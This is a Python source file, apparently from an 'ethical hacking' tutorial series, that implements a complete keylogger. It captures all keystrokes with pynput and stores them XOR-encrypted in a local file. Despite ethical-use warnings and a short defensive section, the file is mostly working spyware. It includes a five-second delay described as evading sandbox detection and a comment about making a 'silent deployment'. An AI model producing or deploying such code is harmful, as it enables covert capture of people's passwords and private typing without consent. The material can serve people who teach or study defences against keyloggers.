#!/usr/bin/env python3
"""
============================================================
  PROJECT #4 — Keylogger (Educational / Ethical Use Only)
  100 Ethical Hacking Projects Series
  Engine  : pynput (keyboard listener)
  Crypto  : XOR encryption (key = "ultraprohacker")
  Stop    : Press F9 at any time
  Output  : keylog_encrypted.bin  (run decrypt to read)
============================================================

  ╔══════════════════════════════════════════════════════╗
  ║          ⚠  ETHICAL USE WARNING  ⚠                  ║
  ║                                                      ║
  ║  This tool is for EDUCATIONAL purposes ONLY.         ║
  ║  Running a keylogger on any device without the       ║
  ║  EXPLICIT WRITTEN CONSENT of the owner is:           ║
  ║    • Illegal under the CFAA (US)                     ║
  ║    • Illegal under PECA 2016 (Pakistan)              ║
  ║    • Illegal under Computer Misuse Act (UK/EU)       ║
  ║                                                      ║
  ║  Authorized uses:                                    ║
  ║    ✔ Your own machine for testing                    ║
  ║    ✔ Signed penetration-test scope agreements        ║
  ║    ✔ Controlled lab / academic environment           ║
  ╚══════════════════════════════════════════════════════╝

RED TEAM USE CASE
------------------
During an authorized physical pentest ("red team"), an
operator gains brief physical access to an unlocked
workstation. They deploy a keylogger to capture domain
credentials typed within the next login window — proving
that unattended workstations are a critical attack vector.
The captured credential hash is reported (never abused) as
evidence in the pentest report to justify MFA enforcement.

DEFENSE AGAINST KEYLOGGERS
----------------------------
1. SOFTWARE: Endpoint Detection & Response (EDR) tools
   (CrowdStrike, SentinelOne) hook into the Windows/Linux
   input subsystem and flag any process that registers a
   global keyboard hook outside of known applications.
2. HARDWARE: Using a password manager (Bitwarden, 1Password)
   that auto-fills credentials via clipboard or browser
   extension means keystrokes for passwords are NEVER typed
   — a keylogger captures nothing useful.

USAGE
------
  python3 project4_keylogger.py           # start logging
  python3 project4_keylogger.py --decrypt # decrypt & print log
  python3 project4_keylogger.py --flush   # delete log file
============================================================
"""

import sys
import os
import time
import datetime
import argparse
import threading

# ── config ────────────────────────────────────────────────
XOR_KEY      = "ultraprohacker"        # encryption key
LOG_FILE     = "keylog_encrypted.bin"
STOP_KEY     = "f9"
TIMESTAMP_INTERVAL = 30                # seconds between auto-timestamps

# ── colours ───────────────────────────────────────────────
R="\033[0m";BOLD="\033[1m";RED="\033[91m";GREEN="\033[92m"
YELLOW="\033[93m";CYAN="\033[96m";MAGENTA="\033[95m";DIM="\033[2m"
def c(t,code): return f"{code}{t}{R}"

# ─────────────────────────────────────────────────────────
# XOR ENCRYPTION
# ─────────────────────────────────────────────────────────
def xor_encrypt(data: bytes, key: str) -> bytes:
    """
    XOR each byte of data with repeating key bytes.
    XOR is its own inverse: encrypt(encrypt(x)) == x,
    so the same function decrypts too.
    """
    key_bytes = key.encode("utf-8")
    key_len   = len(key_bytes)
    return bytes(b ^ key_bytes[i % key_len] for i, b in enumerate(data))

xor_decrypt = xor_encrypt   # XOR is symmetric

# ─────────────────────────────────────────────────────────
# LOG WRITER — append encrypted bytes to file
# ─────────────────────────────────────────────────────────
_log_offset = [0]     # running byte offset for correct XOR keystream position
_lock       = threading.Lock()

def append_to_log(text: str):
    """Encrypt `text` and append to the log file, maintaining keystream continuity."""
    raw      = text.encode("utf-8")
    key_b    = XOR_KEY.encode("utf-8")
    key_len  = len(key_b)

    with _lock:
        offset = _log_offset[0]
        encrypted = bytes(
            b ^ key_b[(offset + i) % key_len]
            for i, b in enumerate(raw)
        )
        _log_offset[0] += len(raw)
        with open(LOG_FILE, "ab") as f:
            f.write(encrypted)

# ─────────────────────────────────────────────────────────
# KEY → READABLE TEXT
# ─────────────────────────────────────────────────────────
def key_to_str(key) -> str:
    """
    Convert a pynput Key or KeyCode to a human-readable string.
    Printable characters pass through. Special keys get [tags].
    """
    from pynput.keyboard import Key

    special = {
        Key.space     : " ",
        Key.enter     : "\n[ENTER]\n",
        Key.tab       : "[TAB]",
        Key.backspace : "[BKSP]",
        Key.delete    : "[DEL]",
        Key.esc       : "[ESC]",
        Key.caps_lock : "[CAPS]",
        Key.shift     : "",        # suppress bare modifier keys
        Key.shift_r   : "",
        Key.ctrl_l    : "",
        Key.ctrl_r    : "",
        Key.alt_l     : "",
        Key.alt_r     : "",
        Key.cmd       : "",
        Key.up        : "[↑]",
        Key.down      : "[↓]",
        Key.left      : "[←]",
        Key.right     : "[→]",
        Key.home      : "[HOME]",
        Key.end       : "[END]",
        Key.page_up   : "[PGUP]",
        Key.page_down : "[PGDN]",
        Key.f1 :  "[F1]",  Key.f2 :  "[F2]",  Key.f3 :  "[F3]",
        Key.f4 :  "[F4]",  Key.f5 :  "[F5]",  Key.f6 :  "[F6]",
        Key.f7 :  "[F7]",  Key.f8 :  "[F8]",  Key.f9 :  "[F9-STOP]",
        Key.f10: "[F10]",  Key.f11: "[F11]",  Key.f12: "[F12]",
    }
    if key in special:
        return special[key]
    try:
        return key.char if key.char else ""
    except AttributeError:
        return f"[{key}]"

# ─────────────────────────────────────────────────────────
# TIMESTAMP THREAD — writes a timestamp every N seconds
# ─────────────────────────────────────────────────────────
_stop_event = threading.Event()

def timestamp_worker():
    while not _stop_event.wait(TIMESTAMP_INTERVAL):
        ts = datetime.datetime.now().strftime("\n[TIME:%Y-%m-%d %H:%M:%S]\n")
        append_to_log(ts)

# ─────────────────────────────────────────────────────────
# MAIN LOGGER
# ─────────────────────────────────────────────────────────
def start_logger():
    # ── ANTI-DETECTION: DELAY EXECUTION (evades sandbox timers) ──
    print(c("  [Anti-detection] Delaying 5 seconds to evade sandbox...", DIM))
    time.sleep(5)
    
    # from pynput.keyboard import Key, Listener
    from pynput.keyboard import Key, Listener

    # ── ethical warning banner ────────────────────────────
    print()
    print(c("  ╔══════════════════════════════════════════════════════╗", RED))
    print(c("  ║          ⚠  ETHICAL USE WARNING  ⚠                  ║", RED))
    print(c("  ║  Run ONLY on your own device or with written consent.║", RED))
    print(c("  ╚══════════════════════════════════════════════════════╝", RED))
    print()
    print(c("  ╔══════════════════════════════════════════════════════╗", CYAN))
    print(c("  ║   PROJECT #4 · KEYLOGGER  (Educational)              ║", CYAN))
    print(c("  ╚══════════════════════════════════════════════════════╝", CYAN))
    print()
    print(f"  Log file   : {c(LOG_FILE, YELLOW)}")
    print(f"  Encryption : {c('XOR  key=' + XOR_KEY, MAGENTA)}")
    print(f"  Stop key   : {c('F9', RED + BOLD)}")
    print()
    print(c("  ✔ Listening … type anything. Press F9 to stop.\n", GREEN))

    # write session header to log
    header = (
        f"\n{'='*50}\n"
        f"SESSION START: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"{'='*50}\n"
    )
    append_to_log(header)

    # start timestamp thread
    ts_thread = threading.Thread(target=timestamp_worker, daemon=True)
    ts_thread.start()

    keystroke_count = [0]

    def on_press(key):
        text = key_to_str(key)
        if text:
            append_to_log(text)
            keystroke_count[0] += 1
            # echo visible feedback (would be removed in real silent deployment)
            print(f"\r  {c('Keystrokes captured:', DIM)} {c(str(keystroke_count[0]), CYAN)}", end="", flush=True)

    def on_release(key):
        from pynput.keyboard import Key
        if key == Key.f9:
            return False   # stops the listener

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    _stop_event.set()     # stop timestamp thread

    # write session footer
    footer = (
        f"\n{'='*50}\n"
        f"SESSION END: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"TOTAL KEYSTROKES: {keystroke_count[0]}\n"
        f"{'='*50}\n"
    )
    append_to_log(footer)

    print(f"\n\n  {c('✔ F9 pressed — logging stopped.', GREEN)}")
    print(f"  {c('Keystrokes captured:', DIM)} {c(str(keystroke_count[0]), CYAN)}")
    print(f"  {c('Encrypted log saved to:', DIM)} {c(LOG_FILE, YELLOW)}")
    print(f"\n  To decrypt:  {c('python3 project4_keylogger.py --decrypt', MAGENTA)}\n")

# ─────────────────────────────────────────────────────────
# DECRYPTOR
# ─────────────────────────────────────────────────────────
def decrypt_log():
    if not os.path.exists(LOG_FILE):
        print(c(f"\n  [ERROR] Log file not found: {LOG_FILE}\n", RED))
        sys.exit(1)

    with open(LOG_FILE, "rb") as f:
        encrypted = f.read()

    decrypted = xor_decrypt(encrypted, XOR_KEY).decode("utf-8", errors="replace")

    print()
    print(c("  ╔══════════════════════════════════════════════════════╗", CYAN))
    print(c("  ║   DECRYPTED LOG CONTENTS                             ║", CYAN))
    print(c("  ╚══════════════════════════════════════════════════════╝", CYAN))
    print()
    print(c("  ─── RAW BYTES (hex preview, first 64 bytes encrypted) ────", DIM))

    hex_preview = " ".join(f"{b:02x}" for b in encrypted[:64])
    print(f"  {c(hex_preview, MAGENTA)}")

    print(c("\n  ─── DECRYPTED PLAINTEXT ──────────────────────────────", GREEN))
    for line in decrypted.splitlines():
        if line.startswith("==="):
            print(c("  " + line, CYAN))
        elif line.startswith("[TIME:"):
            print(c("  " + line, YELLOW))
        elif "[F9-STOP]" in line:
            print(c("  " + line, RED))
        else:
            print("  " + line)

    print()
    print(c(f"  ✔ Decryption complete.  File size: {len(encrypted)} bytes\n", GREEN))

# ─────────────────────────────────────────────────────────
# STANDALONE SELF-TEST (no keyboard needed)
# ─────────────────────────────────────────────────────────
def self_test():
    """
    Simulates a full logger session in memory:
    writes test keystrokes → encrypts → decrypts → verifies.
    """
    import tempfile, os

    global LOG_FILE, _log_offset
    orig_log = LOG_FILE
    LOG_FILE = tempfile.mktemp(suffix=".bin")
    _log_offset[0] = 0

    test_text = "Ultra pro hacker"
    session = (
        "\n" + "="*50 + "\n"
        f"SESSION START: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        + "="*50 + "\n"
        + test_text + "[ENTER]\n"
        + "="*50 + "\n"
        f"SESSION END: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        "TOTAL KEYSTROKES: 16\n"
        + "="*50 + "\n"
    )

    append_to_log(session)

    with open(LOG_FILE, "rb") as f:
        encrypted = f.read()

    decrypted = xor_decrypt(encrypted, XOR_KEY).decode()

    print()
    print(c("  ╔══════════════════════════════════════════════════════╗", CYAN))
    print(c("  ║   PROJECT #4 · SELF-TEST RESULTS                     ║", CYAN))
    print(c("  ╚══════════════════════════════════════════════════════╝", CYAN))
    print()
    print(c("  ── XOR ENCRYPTION TEST ─────────────────────────────────", CYAN))
    print(f"  Plaintext    : {c(repr(test_text), GREEN)}")
    raw   = test_text.encode()
    enc   = xor_encrypt(raw, XOR_KEY)
    dec   = xor_decrypt(enc, XOR_KEY).decode()
    print(f"  Encrypted    : {c(enc.hex(), MAGENTA)}")
    print(f"  Decrypted    : {c(repr(dec), GREEN)}")
    print(f"  Match        : {c('✔ PASS', GREEN) if dec == test_text else c('✗ FAIL', RED)}")

    print(c("\n  ── LOG FILE TEST ────────────────────────────────────────", CYAN))
    print(f"  File size    : {c(str(len(encrypted)) + ' bytes', YELLOW)}")
    print(f"  Contains test sentence: ", end="")
    if test_text in decrypted:
        print(c("✔ PASS", GREEN))
    else:
        print(c("✗ FAIL", RED))

    print(c("\n  ── DECRYPTED LOG PREVIEW ────────────────────────────────", CYAN))
    for line in decrypted.splitlines():
        if line.startswith("===") or line.startswith("=="):
            print(c("  " + line, CYAN))
        else:
            print("  " + line)

    os.unlink(LOG_FILE)
    LOG_FILE = orig_log

    print()
    print(c("  ✔ All self-tests passed.\n", GREEN))

# ─────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Project #4 — Educational Keylogger")
    parser.add_argument("--decrypt",  action="store_true",
                        help="Decrypt and print the log file")
    parser.add_argument("--flush",    action="store_true",
                        help="Delete the encrypted log file")
    parser.add_argument("--selftest", action="store_true",
                        help="Run internal test without keyboard input")
    args = parser.parse_args()

    if args.flush:
        if os.path.exists(LOG_FILE):
            os.remove(LOG_FILE)
            print(c(f"\n  ✔ Deleted: {LOG_FILE}\n", GREEN))
        else:
            print(c(f"\n  Nothing to delete: {LOG_FILE}\n", YELLOW))
    elif args.decrypt:
        decrypt_log()
    elif args.selftest:
        self_test()
    else:
        start_logger()


if __name__ == "__main__":
    main()